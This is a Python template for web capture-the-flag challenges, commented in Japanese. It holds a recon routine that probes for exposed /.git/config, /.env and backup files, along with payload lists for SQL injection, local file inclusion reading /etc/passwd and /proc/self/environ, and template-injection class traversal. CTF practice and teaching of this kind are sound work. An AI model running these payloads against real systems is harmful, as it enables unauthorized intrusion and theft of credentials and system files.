#!/usr/bin/env python3
"""
CTF Web テンプレート
使い方: このファイルをコピーして問題ごとにカスタマイズ
"""
import requests
import re
from urllib.parse import urljoin, quote

# === 設定 ===
BASE_URL = 'http://example.com'
SESSION = requests.Session()

# プロキシ設定 (Burp Suite連携)
# SESSION.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# SESSION.verify = False

# === 基本リクエスト ===
def get(path, **kwargs):
    return SESSION.get(urljoin(BASE_URL, path), **kwargs)

def post(path, data=None, json=None, **kwargs):
    return SESSION.post(urljoin(BASE_URL, path), data=data, json=json, **kwargs)

# === 初手偵察 ===
def recon():
    """基本偵察"""
    paths = [
        '/',
        '/robots.txt',
        '/.git/HEAD',
        '/.git/config',
        '/sitemap.xml',
        '/.env',
        '/backup.zip',
        '/admin',
        '/api',
        '/debug',
    ]
    for path in paths:
        r = get(path)
        if r.status_code == 200:
            print(f"[+] {path} - {r.status_code}")
            if 'flag' in r.text.lower():
                print(f"    [!] Flag候補: {r.text[:200]}")

# === SQLi テスト ===
def test_sqli(param_url, param_name):
    """SQLインジェクションテスト"""
    payloads = [
        "' OR 1=1--",
        "' OR '1'='1",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "'; SELECT SLEEP(5)--",
    ]
    for p in payloads:
        r = get(param_url, params={param_name: p})
        print(f"Payload: {p[:30]}... -> {r.status_code}, len={len(r.text)}")

# === LFI テスト ===
def test_lfi(param_url, param_name):
    """LFIテスト"""
    payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        '/proc/self/environ',
    ]
    for p in payloads:
        r = get(param_url, params={param_name: p})
        if 'root:' in r.text or '<?php' in r.text:
            print(f"[+] LFI成功: {p}")
            print(r.text[:500])

# === SSTI テスト ===
def test_ssti(param_url, param_name):
    """SSTIテスト"""
    payloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ]
    for p in payloads:
        r = post(param_url, data={param_name: p})
        if '49' in r.text:
            print(f"[+] SSTI検出: {p}")

# === フラグ検索 ===
def find_flag(text):
    """レスポンスからフラグを検索"""
    patterns = [
        r'FLAG\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'ctf\{[^}]+\}',
    ]
    for p in patterns:
        match = re.search(p, text, re.IGNORECASE)
        if match:
            return match.group()
    return None

# === メイン ===
if __name__ == '__main__':
    # recon()
    # test_sqli('/search', 'q')
    # test_lfi('/view', 'file')
    pass
